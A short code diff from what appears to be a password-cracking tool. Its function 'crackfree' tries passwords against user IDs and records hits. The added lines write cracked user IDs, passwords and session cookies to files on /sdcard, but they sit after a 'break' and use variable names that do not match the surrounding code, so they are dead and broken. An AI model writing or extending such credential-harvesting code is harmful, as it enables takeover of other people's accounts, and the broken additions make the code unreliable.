@@ -748,6 +748,10 @@ def crackfree(idf,pwv):
                 os.system('espeak -a 300 " Ok,  Tutul,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
+                open('/sdcard/SK-TUTUL-FILE-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+                ok.append(uid)
+                open('/sdcard/SK-TUTUL-FILE-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+                cps.append(uid)
                 
             else:
                 continue
